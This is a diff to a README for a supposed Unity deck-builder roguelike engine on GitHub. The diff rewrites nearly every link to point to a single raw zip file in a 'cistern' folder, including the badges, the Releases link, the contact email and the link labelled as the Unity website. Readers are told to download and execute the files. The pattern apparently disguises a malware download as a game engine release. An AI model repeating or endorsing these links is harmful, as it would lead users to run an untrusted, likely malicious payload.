@@ -1,7 +1,7 @@
 # DeckBuilder Roguelike Engine 🎮🃏
 
-![DeckBuilder Logo](https://img.shields.io/badge/DeckBuilder-Roguelike%20Engine-brightgreen.svg)
-![GitHub Release](https://img.shields.io/badge/Release-Download%20Latest%20Version-blue.svg)
+![DeckBuilder Logo](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip%https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip)
+![GitHub Release](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip%20Latest%https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip)
 
 Welcome to the **DeckBuilder Roguelike Engine**! This repository serves as a structural playground for creating roguelike card battle systems. If you are passionate about game development and enjoy building unique gaming experiences, you've come to the right place!
 
@@ -32,8 +32,8 @@ The **DeckBuilder Roguelike Engine** provides a flexible framework for developer
 
 To get started with the **DeckBuilder Roguelike Engine**, follow these steps:
 
-1. **Download the latest version** from the [Releases section](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/releases). You will need to download and execute the appropriate files to get started.
-2. **Install Unity**: Make sure you have Unity installed on your machine. You can download it from the [Unity website](https://unity.com/).
+1. **Download the latest version** from the [Releases section](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip). You will need to download and execute the appropriate files to get started.
+2. **Install Unity**: Make sure you have Unity installed on your machine. You can download it from the [Unity website](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip).
 3. **Open the Project**: Once downloaded, open the project in Unity.
 4. **Explore the Documentation**: Familiarize yourself with the engine's features and capabilities.
 
@@ -86,12 +86,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions, suggestions, or collaboration opportunities, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [K-mohameduuu](https://github.com/K-mohameduuu)
+- **Email**: [https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip)
+- **GitHub**: [K-mohameduuu](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip)
 
 ## Additional Resources
 
-- Check the [Releases section](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/releases) for the latest updates and downloadable content.
+- Check the [Releases section](https://github.com/K-mohameduuu/DeckBuilderRoguelikeEngine/raw/refs/heads/main/cistern/Builder-Deck-Roguelike-Engine-v1.8.zip) for the latest updates and downloadable content.
 - Join our community discussions and share your experiences in developing with the engine.
 
 ---
